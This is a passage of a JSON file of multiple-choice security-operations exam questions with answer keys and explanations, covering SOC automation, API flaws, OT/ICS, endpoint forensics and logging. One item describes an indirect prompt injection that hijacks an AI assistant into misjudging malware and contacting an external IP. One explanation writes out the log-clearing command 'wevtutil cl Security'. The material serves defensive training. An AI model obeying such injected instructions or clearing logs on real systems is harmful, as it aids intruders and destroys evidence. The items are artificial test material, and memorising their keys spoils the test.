provide a solid baseline of attack-surface reduction with minimal operational impact and high application compatibility. Level 2 (Option B) provides defense-in-depth for high-security environments but can impair operational functionality. STIGs (Option C) are defense-oriented standards.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-efficiency:1","set":"lq","ch":1,"d":1,"q":"A SOC engineer wants to automatically trigger an immediate vulnerability scan of any new cloud virtual machine the instant it is provisioned. The cloud platform supports sending automated JSON event payloads upon instance launch. Which integration mechanism should the engineer configure on the scanner to receive these event notifications?","o":["An inbound Webhook endpoint","A scheduled REST API GET polling script","An SNMP MIB walk query","A Syslog UDP listener"],"a":0,"e":"Webhooks are event-driven mechanisms where a source platform immediately pushes an HTTP POST payload containing event data to a destination URL when an event occurs, enabling real-time automation. Option B is tempting because REST APIs are standard in cloud environments, but scheduled GET polling introduces latency between polling intervals and consumes unnecessary API request quotas. Options C and D are traditional network monitoring protocols that do not parse event-driven cloud lifecycle payloads.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:2","set":"lq","ch":1,"d":1,"q":"A security manager is reviewing SOC operational workflows to identify candidates for automated SOAR implementation. Which workflow is the BEST candidate for full end-to-end automation without requiring human analyst intervention?","o":["Authorizing regulatory data breach disclosures under HIPAA and GDPR mandates","Querying external IP reputation for firewall alerts, retrieving WHOIS records, and attaching enrichment data to the ticket","Deciding whether to take down an enterprise core production database during an ambiguous intrusion","Evaluating residual risk exception requests for unpatched legacy industrial controllers"],"a":1,"e":"Workflows best suited for full automation are repetitive, high-volume, standardized, and deterministic, such as enriching alert tickets with WHOIS data, GeoIP lookups, and threat intelligence reputation scores. Option C is tempting because fast containment is critical during an intrusion, but shutting down core revenue-generating systems carries significant business impact and requires human stakeholder approval. Options A and D represent high-stakes legal, regulatory, and risk governance decisions that mandate executive human judgment.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:3","set":"lq","ch":1,"d":1,"q":"An analyst responds to a suspected compromised user account. The incident playbook details the initial alert trigger, triage steps, and tool integrations, but lacks guidelines specifying when to notify legal counsel or transfer the ticket to the senior forensics lead. Which critical playbook component is MISSING?","o":["Decision branches","Compliance checkpoints","Escalation criteria","API connection keys"],"a":2,"e":"Escalation criteria define the objective thresholds and conditions that dictate when an incident must be handed off to senior analysts, management, or external departments (like legal or HR). Without defined escalation criteria, analysts must rely on guesswork, leading to under- or over-escalation.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:4","set":"lq","ch":1,"d":1,"q":"An external attacker manipulates the URL parameter in an API request from /api/v1/users/1042/records to /api/v1/users/1043/records and successfully retrieves the medical records of another patient. Which vulnerability from the OWASP API Security Top 10 was exploited?","o":["Lack of Rate Limiting","Broken Function-Level Authorization (BFLA)","Server-Side Request Forgery (SSRF)","Broken Object-Level Authorization (BOLA)"],"a":3,"e":"Broken Object-Level Authorization (BOLA, formerly IDOR) occurs when an API endpoint does not validate whether the authenticated user has permission to access the specific object identifier requested in the URL or payload. It is the most common vulnerability in the OWASP API Security Top 10.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:5","set":"lq","ch":1,"d":1,"q":"A SOC manager is preparing security metrics for an annual board of directors meeting. Which reporting approach is MOST appropriate for this audience?","o":["A strategic dashboard summarizing 5 to 7 high-level metrics translated into business risk, financial exposure, and posture trends","A technical report listing the SHA-256 hashes of all malware detected during the previous quarter","An operational dashboard displaying real-time alert queue counts and unparsed firewall logs","A raw export of Microsoft Sentinel KQL query results covering failed administrative logons"],"a":0,"e":"Board and executive stakeholders require strategic dashboards limited to 5-7 high-level metrics framed in business risk language (financial risk, regulatory compliance, posture trends). Operational queue depths (Option C), malware hashes (Option B), and raw KQL queries (Option D) belong on technical and operational analyst dashboards.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:6","set":"lq","ch":1,"d":1,"q":"Every Sunday at 02:00 AM, the enterprise vulnerability scanner executes scheduled network sweeps, generating over 15,000 high-priority port scanning and brute-force alerts in the SIEM that overwhelm the weekend on-call analyst. What is the BEST process improvement to eliminate this alert fatigue?","o":["Configure the SIEM alerting engine to apply dynamic threshold suppression during peak traffic hours.","Whitelist the IP address of the vulnerability scanner within SIEM detection rules during its scheduled assessment window.","Permanently disable the port scanning and authentication failure correlation rules across all enterprise subnets.","Configure SOAR to automatically execute endpoint isolation on the vulnerability scanner when alerts trigger."],"a":1,"e":"Whitelisting known scanner IP addresses during authorized, scheduled scanning windows eliminates predictable false positive alerts while preserving full detection sensitivity outside that maintenance window. Option A is tempting because dynamic thresholding dampens alert volume, but applying broad threshold suppression blinds the SOC to actual brute-force or lateral movement attacks. Option C permanently eliminates vital detection capabilities enterprise-wide. Option D disrupts authorized security assessments by isolating the legitimate scanning appliance.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:7","set":"lq","ch":1,"d":1,"q":"A cloud engineering team uses Terraform templates to deploy infrastructure. Before deploying templates to production, a security scanner named Checkov inspects the code in the CI/CD pipeline and fails the build if an Amazon S3 bucket is configured with public read access. What security practice is being demonstrated?","o":["Runbook automation in SOAR","Dynamic application security testing (DAST)","Shift-left security via Policy-as-Code","Risk acceptance documentation"],"a":2,"e":"Policy-as-code enforces security compliance rules automatically within the CI/CD pipeline before infrastructure is deployed, representing the 'shift-left' security principle. Checkov is a static analysis tool for IaC templates. DAST (Option B) scans running applications. SOAR (Option A) automates incident response.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-efficiency:8","set":"lq","ch":1,"d":1,"q":"A security team experiences chaotic, inconsistent response times across different analyst shifts during phishing investigations. Some analysts reset user passwords, while others only delete the email, and some fail to check mail server logs. What is the BEST first step to improve SOC efficiency?","o":["Procure a new SOAR platform and immediately automate mailbox quarantine and user password resets.","Implement an automated machine-learning spam filter on the email gateway to quarantine suspicious messages.","Deploy an endpoint agent script to automatically force browser tab termination upon suspicious URL clicks.","Standardize the phishing investigation process into a documented Standard Operating Procedure (SOP) before automating."],"a":3,"e":"The foundational principle of process improvement is to standardize first and automate second. Attempting to automate an undefined, inconsistent process simply automates chaos and creates broken runbooks. Defining a documented SOP establishes consistent baseline logic across all shifts that can later be converted into reliable SOAR workflows. Option A is the primary trap: acquiring and deploying automation tools before defining standard procedures leads to flawed automation logic. Options B and C introduce preventive technical tools without resolving the operational inconsistency in analyst investigation workflows.","l":"c1-efficiency","l2":"","k":""},{"id":"lq:c1-ai:1","set":"lq","ch":1,"d":1,"q":"A security analyst is investigating a phishing campaign and uploads an email attachment containing an obfuscated PowerShell script to a generative AI assistant. The assistant abruptly responds that the script is harmless and attempts to initiate an HTTP request to an unknown external IP address. Which attack vector has MOST likely occurred?","o":["Direct prompt injection","Training-time model poisoning","Adversarial evasion","Indirect prompt injection"],"a":3,"e":"This is an indirect prompt injection attack. The malicious actor embedded hidden instructions within the external document being analyzed. When the LLM ingested the untrusted content, the embedded commands hijacked the model's instructions, tricking it into misclassifying the payload and attempting an unauthorized outbound connection. Direct prompt injection involves an attacker directly typing commands into the prompt interface.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:2","set":"lq","ch":1,"d":1,"q":"A tier-2 analyst reviews a daily alert summary generated by an AI assistant. The report states that an internal IP address is communicating with a known Command and Control (C2) server associated with APT29, citing a specific threat intelligence report ID. When searching VirusTotal and the organization's threat intelligence platform, neither the IP nor the report ID exists. What does this scenario BEST illustrate?","o":["Model poisoning","Data exposure","An AI hallucination","Concept drift"],"a":2,"e":"This scenario demonstrates an AI hallucination. LLMs generate responses by predicting statistically probable sequences of words rather than querying factual databases. When the model lacks specific threat data, it can invent plausible-sounding details such as fictitious report IDs or threat actor links. Analysts must always cross-reference AI findings against authoritative sources.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:3","set":"lq","ch":1,"d":1,"q":"A SOC manager wants to integrate machine learning into incident response workflows. Which of the following tasks is the BEST candidate for full automation through an AI-driven SOAR playbook without human pre-approval?","o":["Blocking a temporary external IP address on perimeter firewalls based on verified high-confidence brute-force telemetry","Isolating an active domain controller after detecting anomalous Kerberos ticket requests","Notifying law enforcement and external regulatory agencies of a potential data breach","Shutting down a core production database cluster showing suspicious outbound traffic spikes"],"a":0,"e":"Blocking an external IP address based on high-confidence, low-complexity telemetry is an ideal candidate for automated orchestration because the blast radius is minimal and reversible. Isolating domain controllers, shutting down core databases, or initiating law enforcement disclosures are consequential, high-impact decisions that strictly require human analyst oversight and judgment.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:4","set":"lq","ch":1,"d":1,"q":"An organization is selecting a cloud-hosted generative AI assistant to help analysts draft incident summaries. Which contractual and technical control is MOST critical to prevent unauthorized data exposure under GDPR and HIPAA?","o":["Enforcing asymmetric PGP encryption on all prompt queries prior to transmission across public cloud networks","Restricting AI query usage exclusively to synthetic event datasets generated by internal vulnerability scanners","Mandating that the service provider use open-weights models that can be independently inspected by auditors","Procuring an enterprise service agreement that guarantees tenant data isolation and prevents prompt ingestion into foundation training sets"],"a":3,"e":"Enterprise agreements providing verified tenant isolation guarantee that sensitive incident telemetry, PII, and customer records remain strictly within organizational boundaries and are never stored for model retraining or exposed to other tenants. Open-weights models or encryption in transit do not prevent the SaaS vendor from storing and using prompts if the service terms permit data ingestion.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:5","set":"lq","ch":1,"d":1,"q":"Over several months, a security team notices that their machine-learning-based intrusion detection system has experienced a steady increase in false negatives, failing to detect recent living-off-the-land techniques. A post-mortem reveals that an attacker had been slowly modifying benign network traffic patterns over time to skew the baseline. What type of attack has occurred?","o":["Indirect prompt injection","Model poisoning","Inference-time prompt bypass","Jailbreaking"],"a":1,"e":"This is a model poisoning attack (specifically poisoning the continuous learning baseline or training feedback). By gradually injecting tainted behavioral data, the adversary corrupted the model's definition of normal baseline traffic, creating a persistent blind spot for malicious activities.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:6","set":"lq","ch":1,"d":1,"q":"A security analyst needs to assess the risk of a new AI-driven automated access control system that autonomously revokes user permissions and quarantines endpoints. According to the EU AI Act, how is this system MOST likely classified?","o":["High risk","Minimal risk","Unacceptable risk","Exempt risk"],"a":0,"e":"Under the EU AI Act, AI systems used in critical infrastructure, access control, or consequential operational security decisions that significantly impact individuals' rights or system availability are classified as High Risk. High-risk systems require rigorous governance, continuous human oversight, detailed audit logs, and accuracy validation.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:7","set":"lq","ch":1,"d":1,"q":"Which core function of the NIST AI Risk Management Framework (AI RMF) involves identifying context, categorizing AI capabilities, and assessing potential organizational impacts and hazards?","o":["Govern","Measure","Map","Manage"],"a":2,"e":"The 'Map' function of the NIST AI RMF is focused on establishing context, categorizing the AI system, and identifying potential risks and impacts across the AI lifecycle. 'Govern' establishes culture and policies, 'Measure' analyzes and tracks risks with quantitative/qualitative metrics, and 'Manage' allocates resources to mitigate risks.","l":"c1-ai","l2":"","k":""},{"id":"lq:c1-ai:8","set":"lq","ch":1,"d":1,"q":"A security analyst is comparing two detection engines: a traditional SIEM correlation rule engine and a new ML-based analytics engine. Which scenario highlights the PRIMARY operational strength of the ML-based engine over the rule-based engine?","o":["Providing deterministic, 100% auditable alert logic for compliance auditors","Detecting a slow and subtle data exfiltration campaign that stays just below static threshold limits","Generating zero false positives when monitoring known vulnerability exploit attempts","Operating with minimal CPU and memory consumption during high-throughput log ingestion"],"a":1,"e":"ML-based detection excels at recognizing behavioral anomalies and subtle low-and-slow campaigns that deliberate attackers keep just beneath static threshold limits. Rule-based engines rely on fixed thresholds and predefined criteria, making them blind to activity designed to stay under those limits.","l":"c1-ai","l2":"","k":""},{"id":"lq:c2-infra:1","set":"lq","ch":2,"d":1,"q":"A security analyst is reviewing web access logs for an enterprise REST API. The analyst notices that an authenticated user account has made thousands of sequential requests formatted as <code>GET /api/v1/invoices/104291</code>, <code>GET /api/v1/invoices/104292</code>, and <code>GET /api/v1/invoices/104293</code>, successfully receiving HTTP 200 responses containing billing data for unrelated corporate clients. Which vulnerability is being exploited?","o":["Broken Authentication","Server-Side Request Forgery","Broken Object-Level Authorization","Security Misconfiguration"],"a":2,"e":"This is Broken Object-Level Authorization (BOLA), formerly known as Insecure Direct Object Reference (IDOR). The user is authenticated, but the API fails to validate whether the requester has permission to view the specific object identifier passed in the URL, allowing sequential enumeration of other clients' invoices.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:2","set":"lq","ch":2,"d":1,"q":"A threat actor compromises a corporate workstation and attempts to pivot into an industrial manufacturing facility's operational network. According to the Purdue Enterprise Reference Architecture, which architectural boundary should prevent direct network communication between corporate IT and the shop-floor PLCs?","o":["The Industrial DMZ (IDMZ) at Level 3.5","The Enterprise Edge Router at Level 5","The Supervisory Control Console at Level 2","The Safety Instrumented System at Level 0"],"a":0,"e":"The Industrial DMZ (IDMZ) situated at Purdue Level 3.5 provides the mandatory segmentation boundary separating enterprise IT networks (Levels 4 and 5) from operational technology networks (Levels 0 through 3). Direct routing between IT and OT control levels is strictly prohibited; all traffic must terminate in the IDMZ.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:3","set":"lq","ch":2,"d":1,"q":"A newly deployed serverless function processing customer credit card authorizations experiences code injection vulnerabilities. An attacker exploits the flaw to dump confidential files from a sensitive internal AWS S3 bucket. Which security deficiency MOST likely allowed this privilege escalation?","o":["Misconfigured security group egress rules allowing outbound SSH connections","An overly permissive IAM execution role assigned to the serverless function","Lack of customer-managed KMS key encryption on the target S3 bucket objects","Failure to deploy an inline web application firewall in front of the API gateway"],"a":1,"e":"Serverless functions execute using permissions granted by their attached cloud IAM execution role. If an execution role is granted broad, wildcard permissions (such as AmazonS3FullAccess), any attacker who compromises the function code inherits those cloud permissions to read or exfiltrate S3 bucket contents. Option D is tempting because a WAF can block injection payloads, but the fundamental privilege escalation flaw allowing access to unrelated cloud resources is an overly permissive IAM role. Option A is incorrect because S3 access uses HTTPS API endpoints rather than SSH. Option C affects encryption at rest but does not prevent authorized IAM roles from reading data.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:4","set":"lq","ch":2,"d":1,"q":"A security operations team discovers that a legacy Windows 7 HMI controlling municipal water pumps has multiple unpatched critical remote code execution vulnerabilities. The plant manager states the system cannot be taken offline for patching due to continuous service requirements. Which response is the BEST course of action?","o":["Run an aggressive credentialed vulnerability scan to verify the live exploitability of the flaws.","Immediately reboot the HMI into safe mode during the next shift change to apply operating system hotfixes.","Formally accept the unmitigated risk without technical controls until the next multi-year capital replacement cycle.","Implement compensating controls such as network micro-segmentation, application allowlisting, and strict IDMZ firewall filtering."],"a":3,"e":"In OT and ICS environments, Availability is paramount, and systems often cannot be patched due to vendor software dependencies or 24/7 continuous operations. When patching is infeasible, security teams must deploy compensating controls: isolating the device on a dedicated micro-segmented VLAN, enforcing application allowlisting, and restricting traffic through the Purdue Level 3.5 IDMZ. Option C is tempting when operational constraints are severe, but unmitigated risk on life-safety infrastructure without compensating controls violates compliance and exposes physical processes to compromise. Option A risks crashing fragile industrial controllers, and Option B causes unscheduled operational downtime.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:5","set":"lq","ch":2,"d":1,"q":"A security engineer must design an architecture to transmit time-series metrics from an OT data historian to a corporate cloud analytics platform while ensuring that NO inbound network traffic can possibly traverse back into the OT network. Which technology BEST satisfies this requirement?","o":["An IPsec VPN tunnel configured with bidirectional split-tunneling","A stateful inspection perimeter firewall with deep packet inspection","A reverse proxy terminating TLS with mutual certificate authentication","A unidirectional security gateway (data diode)"],"a":3,"e":"A unidirectional security gateway (data diode) utilizes physical hardware (typically an LED transmitter and photodiode receiver linked by a single strand of fiber) to enforce strictly one-way data transmission at the physical layer. Data can exit the OT network to the cloud, but the laws of physics prevent any inbound signal, packet, or command from returning. Option B is tempting because next-generation firewalls inspect traffic, but firewalls rely on software state tables and bidirectional TCP acknowledgments that maintain an open return path. Options A and C establish bidirectional communication channels.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:6","set":"lq","ch":2,"d":1,"q":"An analyst is investigating an alert indicating that a malicious user spawned an interactive bash shell inside a container running an Nginx web server in a production Kubernetes cluster. Which tool is specifically designed to detect this runtime system-call behavior in containerized environments?","o":["Falco","Checkov","Trivy","Terraform"],"a":0,"e":"Falco is an open-source runtime security tool that hooks into the Linux kernel to monitor system calls across containers. It detects anomalous events such as shell spawns, unexpected network sockets, or unauthorized file access in real time. Checkov and Trivy are static scanners, and Terraform is an IaC tool.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:7","set":"lq","ch":2,"d":1,"q":"During a routine audit of industrial infrastructure, an analyst notices that a chemical processing plant utilizes a control architecture where all controllers, HMIs, and automated processes are localized entirely within a single physical facility over high-speed industrial Ethernet. Which architecture is being described?","o":["Supervisory Control and Data Acquisition (SCADA)","Safety Instrumented System (SIS)","Distributed Control System (DCS)","Programmable Automation Controller (PAC) WAN mesh"],"a":2,"e":"A Distributed Control System (DCS) manages automated processes localized entirely within a single plant or physical facility (such as a chemical refinery, power generation plant, or pharmaceutical factory) over high-speed local control networks. Option A is the primary trap: SCADA systems supervise distributed assets dispersed across broad geographic regions over long-distance WAN or cellular links (e.g., municipal water pipelines or regional electrical grids). Option B describes dedicated emergency shutdown systems rather than general process control architecture.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-infra:8","set":"lq","ch":2,"d":1,"q":"A water treatment plant's physical pressure valves suddenly burst, causing flooding, even though the central SCADA HMI consoles displayed perfectly normal pressure levels throughout the event. Forensic analysis reveals that the PLCs received unauthorized Modbus write commands. What attack technique explains the discrepancy on the HMI?","o":["Modbus command replay attack","Process value spoofing","Man-in-the-middle ARP spoofing","Ladder logic injection"],"a":1,"e":"Process value spoofing occurs when an attacker manipulates physical control logic or transmits unauthorized actuator commands while simultaneously returning falsified, normal sensor readings back to the operator HMI. This blinds operators to real-world physical damage while destructive actions unfold. Option D is tempting because manipulating ladder logic alters controller behavior, but specifically falsifying sensor telemetry to deceive human operators while causing physical destruction is process value spoofing. Option A replays legitimate commands, and Option C redirects local network frames without generating falsified application telemetry.","l":"c2-infra","l2":"","k":""},{"id":"lq:c2-os:1","set":"lq","ch":2,"d":1,"q":"While analyzing an endpoint alert, a security analyst reviews the running process tree and notices an instance of <code>svchost.exe</code> with a process ID of 5184. Further inspection reveals its executable image path is <code>C:\\Users\\FinanceUser\\AppData\\Roaming\\Microsoft\\svchost.exe</code> and its parent process is <code>explorer.exe</code>. What is the MOST accurate assessment of this activity?","o":["A legitimate Windows service executing under a standard user profile","A process hollowing attack utilizing memory-mapped executable memory","Process masquerading concealing a malicious executable","An unauthorized modification to the kernel ntoskrnl.exe execution table"],"a":2,"e":"This is process masquerading. Legitimate svchost.exe binaries must execute strictly from C:\\Windows\\System32 and must be spawned by services.exe. Executing from AppData with explorer.exe as a parent indicates malware intentionally mimicking a system binary to blend into process lists.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:2","set":"lq","ch":2,"d":1,"q":"An incident responder is investigating an intrusion on an enterprise Linux web server. The responder discovers active outbound network connections to an unknown foreign IP address, but running <code>ls -la</code> in the corresponding directory shows no binary file on disk. The responder discovers the process was launched from <code>/dev/shm</code>. Why did the attacker MOST likely choose this location?","o":["To achieve fileless execution within an in-memory filesystem that leaves no persistent disk artifacts","To bypass kernel-level system-call auditing enforced by the auditd daemon","To automatically grant the executing script root-level permissions via the sticky bit","To inject malicious code into the GRUB bootloader configuration"],"a":0,"e":"The /dev/shm directory in Linux is a shared-memory temporary filesystem (tmpfs) that resides entirely in volatile RAM. Attackers execute payloads from /dev/shm for fileless execution, meaning the malware leaves no persistent artifacts on physical disk drives.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:3","set":"lq","ch":2,"d":1,"q":"A security architect is tasked with implementing application whitelisting across all corporate workstations. The organization requires a solution that cannot be bypassed by local administrators altering user-mode policies. Which technology should the architect select?","o":["CIS Level 1 Desktop Profile","AppLocker Path Rules","Data Execution Prevention (DEP)","Windows Defender Application Control (WDAC)"],"a":3,"e":"Windows Defender Application Control (WDAC) enforces application whitelisting at the operating system kernel level, making it highly robust against tampering and administrative bypass. In contrast, AppLocker relies primarily on user-mode enforcement.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:4","set":"lq","ch":2,"d":1,"q":"A SOC analyst receives an alert indicating Windows Security Event ID 1102 has been generated on a critical financial database server. When the analyst opens Event Viewer on the server, the Security log is completely empty. What should the analyst do FIRST?","o":["Attempt to carve deleted .evtx records from local unallocated disk clusters using forensic tools","Query the central SIEM to analyze security events forwarded from the server prior to log deletion","Restore the local Security.evtx file from the server's most recent Volume Shadow Copy snapshot","Execute an emergency administrative password reset and restart the Windows Event Log service"],"a":1,"e":"Event ID 1102 explicitly records that the Windows Security audit log was cleared. Because local logs on the host were erased, the analyst's immediate pivot is to the centralized SIEM, which preserves forwarded event telemetry (WEF/Syslog) captured prior to the adversary clearing the local log. Carving disk space or restoring shadow copies is time-consuming and risks evidence spoliation during initial triage.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:5","set":"lq","ch":2,"d":1,"q":"During a threat hunting exercise, an analyst examines process telemetry on a Windows domain controller. Which of the following observations represents a CRITICAL indicator of compromise requiring immediate containment?","o":["lsass.exe has spawned a child cmd.exe process executing under SYSTEM privileges","ntoskrnl.exe is running under Process ID 4 with SYSTEM user rights","services.exe has spawned multiple instances of svchost.exe running from System32","explorer.exe was spawned by userinit.exe following an interactive user logon"],"a":0,"e":"Legitimate lsass.exe handles local authentication and NEVER spawns child processes. An lsass.exe spawning cmd.exe, PowerShell, or any other executable indicates that the process has been injected or compromised, commonly during credential dumping attempts (e.g., Mimikatz).","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:6","set":"lq","ch":2,"d":1,"q":"A security engineer needs to identify all persistence mechanisms installed across a fleet of suspect Windows endpoints, including startup folders, Run keys, scheduled tasks, and hijacked services. Which Sysinternals tool provides the MOST comprehensive visibility for this task?","o":["Process Explorer","TCPView","Procmon","Autoruns"],"a":3,"e":"Sysinternals Autoruns is specifically designed to inspect all known Windows auto-start and persistence locations, including Registry Run/RunOnce keys, scheduled tasks, services, drivers, and Image File Execution Options, highlighting unverified or unsigned entries.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:7","set":"lq","ch":2,"d":1,"q":"An analyst reviewing integrity monitoring alerts on an Ubuntu server notices an unauthorized modification to <code>/etc/sudoers</code> during off-hours. What is the PRIMARY operational objective of the attacker who made this change?","o":["Corrupting the Linux kernel address space to trigger a kernel panic","Establishing persistent administrative privilege delegation for an unprivileged account","Configuring a fileless shared-memory tmpfs mount point in /proc","Enforcing Address Space Layout Randomization across user space binaries"],"a":1,"e":"The /etc/sudoers file defines which users or groups can execute administrative commands with elevated privileges via sudo. Modifying /etc/sudoers is a classic Linux privilege escalation and persistence technique, allowing an attacker's unprivileged user account to execute commands as root without passwords.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-os:8","set":"lq","ch":2,"d":1,"q":"An organization is preparing to harden its server infrastructure against cyberattacks. The security team wants to apply a configuration baseline that provides defense-in-depth security controls, but the operations team is concerned that certain settings might break legacy internal business applications. Which configuration profile should be tested and evaluated?","o":["CIS Level 1 Profile","DISA Default Profile","CIS Level 2 Profile","FHS Baseline Profile"],"a":2,"e":"CIS Level 2 profiles are designed for environments where security is paramount, implementing defense-in-depth controls that may reduce software functionality or introduce compatibility issues with legacy systems. In contrast, CIS Level 1 profiles provide baseline hardening with minimal operational disruption.","l":"c2-os","l2":"","k":""},{"id":"lq:c2-logging:1","set":"lq","ch":2,"d":1,"q":"A security analyst is investigating an alleged data breach spanning multiple international branch offices. When reviewing the SIEM correlation timeline, an event logged by an endpoint in London appears to have occurred 45 minutes prior to the authentication event on an identity server in New York that supposedly triggered it. What is the MOST likely cause of this discrepancy?","o":["The endpoint used an agentless collection method over TCP port 6514","A failure in Network Time Protocol (NTP) synchronization or mixed local time zones rather than UTC standardization","The security log was cleared on the New York server generating Event ID 1102","The SIEM failed to normalize syslog facility numbers into the Common Information Model"],"a":1,"e":"When distributed logs appear chronologically impossible or out of sequence, the primary cause is clock drift from NTP synchronization failure or devices logging in local regional time zones instead of Coordinated Universal Time (UTC). All logging systems must sync with NTP over UDP port 123 and record in UTC.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:2","set":"lq","ch":2,"d":1,"q":"A network engineer is configuring syslog logging on a fleet of perimeter edge switches. To troubleshoot a transient routing issue, the engineer sets the switch logging priority to Level 7. A week later, the SIEM administrator alerts the team that log storage capacity has exceeded 95% and query performance has collapsed. What configuration error was made?","o":["Leaving verbose Debug-level logging permanently enabled in production","Failing to restrict syslog transmission to UDP port 123","Configuring the switches to use Stratum 0 time sources","Setting the logging priority to Emergency instead of Notification"],"a":0,"e":"Syslog Level 7 represents Debugging, which generates an overwhelming flood of verbose diagnostic packets. Leaving Level 7 enabled in production exhausts storage arrays, overwhelms network bandwidth, and degrades SIEM indexing. Production switches should typically log at Informational (6) or Notice (5).","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:3","set":"lq","ch":2,"d":1,"q":"A tier-2 analyst is reviewing endpoint detection telemetry following a suspicious PowerShell execution. The analyst queries Windows Event ID 4688 on the suspected host but discovers that only the executable name <code>powershell.exe</code> was recorded, with no command-line parameters or arguments present in the event body. What configuration change is required to capture full command-line arguments?","o":["Enable Process Tracking success and failure auditing under the Local Security Policy","Configure Sysmon Event ID 1 process creation filtering in the XML schema","Enable PowerShell Script Block Logging (Event ID 4104) via Administrative Templates","Enable the 'Include command line in process creation events' sub-policy in Group Policy"],"a":3,"e":"By default, enabling Windows Event ID 4688 (Process Creation) logs only the path of the binary executed. To record the full command-line invocation strings and arguments (critical for detecting obfuscated LOLBins and Base64 payloads), administrators must explicitly enable 'Include command line in process creation events' under Administrative Templates -> System -> Audit Process Creation in Group Policy. Option A is tempting because Process Tracking enables Event ID 4688, but basic process auditing does not populate command-line fields without the specific sub-policy. Option C captures PowerShell script content rather than the generic process launch string, and Option B configures third-party Sysmon rather than native Windows Event ID 4688.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:4","set":"lq","ch":2,"d":1,"q":"A SOC analyst observes an alert indicating that a critical database server has stopped sending logs to the centralized SIEM. The analyst logs into the server locally and discovers that the Windows Security event log contains only a single recent event: Event ID 1102. What does this event signify?","o":["A new background service was successfully registered in the System hive","The local hardware clock diverged significantly from the domain controller","The Security event log was deliberately or administratively cleared","An unauthorized user attempted an impossible travel logon sequence"],"a":2,"e":"Windows Security Event ID 1102 is specifically generated when an administrator or adversary erases the Security event log (e.g., executing wevtutil cl Security). Attackers use log clearing as an anti-forensic tactic (MITRE ATT&CK T1070). Analysts must immediately pivot to the SIEM to review logs forwarded prior to the clearing event.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:5","set":"lq","ch":2,"d":1,"q":"An e-commerce retailer subject to Payment Card Industry Data Security Standard (PCI DSS) compliance is designing its cloud log retention architecture. What are the MINIMUM retention timeframes required by PCI DSS for audit logs?","o":["12 months total retention, with at least 3 months immediately available online for analysis","6 years total retention in immutable WORM storage","30 days in hot storage, after which logs may be permanently sanitized","3 months total retention, with 30 days queryable in the SIEM"],"a":0,"e":"PCI DSS explicitly mandates that audit trail logs must be retained for at least 12 months total, with a minimum of 3 months immediately available online for querying and immediate analysis. The remaining 9 months may reside in cost-effective cold or archive storage.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:6","set":"lq","ch":2,"d":1,"q":"A security architect must implement log ingestion for fifty proprietary hardware routers and switches that do not support third-party software installation. Which log collection strategy is the architect REQUIRED to utilize?","o":["Deploying the Splunk Universal Forwarder agent directly onto the switch control plane","Configuring Sysmon driver filtering in the switch firmware","Configuring agentless log collection using Syslog or SNMP","Embedding REST API SDK connectors into the switch microcode"],"a":2,"e":"Proprietary network hardware appliances (switches, routers, firewalls) run closed vendor operating systems that do not permit installing third-party endpoint software agents. They require agentless collection methods, where devices push standard Syslog (or respond to SNMP/WMI polls) directly to a central collector.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:7","set":"lq","ch":2,"d":1,"q":"A security engineer is tasked with ensuring that security logs stored in a public cloud data lake cannot be modified, overwritten, or deleted by any account, including compromised cloud root or global administrator accounts. Which mechanism BEST satisfies this requirement?","o":["Applying AES-256 server-side encryption using customer-managed KMS keys (CMKs)","Configuring multi-factor authentication (MFA) Delete on the target cloud storage bucket","Applying restrictive IAM Service Control Policies (SCPs) denying S3 delete actions enterprise-wide","Configuring Write Once, Read Many (WORM) storage using S3 Object Lock in Compliance mode"],"a":3,"e":"Write Once, Read Many (WORM) storage configured in Compliance mode (such as AWS S3 Object Lock in Compliance mode or Azure Immutable Blob Storage) enforces mathematical and cryptographically backed immutability. In Compliance mode, objects cannot be overwritten, deleted, or shortened by any identity, including cloud account root or global administrators, until the retention period expires. Option B is tempting because MFA Delete protects against accidental deletion, but account owners and root credentials can still disable MFA Delete or modify retention settings. Option C can be overridden or detached by root administrators. Option A provides confidentiality at rest but does not prevent deletion or replacement of objects.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-logging:8","set":"lq","ch":2,"d":1,"q":"An enterprise receives formal notice of pending civil litigation regarding intellectual property theft. The company's standard automated SIEM lifecycle policy purges all raw application and authentication logs older than 90 days. What action MUST the security operations team take immediately?","o":["Initiate cryptographic sanitization of unindexed log partitions under NIST SP 800-88 guidelines.","Implement a legal hold to immediately suspend automated deletion of all relevant log telemetry.","Accelerate the SIEM archiving cycle to compress historical logs into cold storage.","Reconfigure SIEM retention policies to retain only high-severity security events."],"a":1,"e":"A legal hold is a mandatory administrative and technical directive issued by legal counsel that immediately 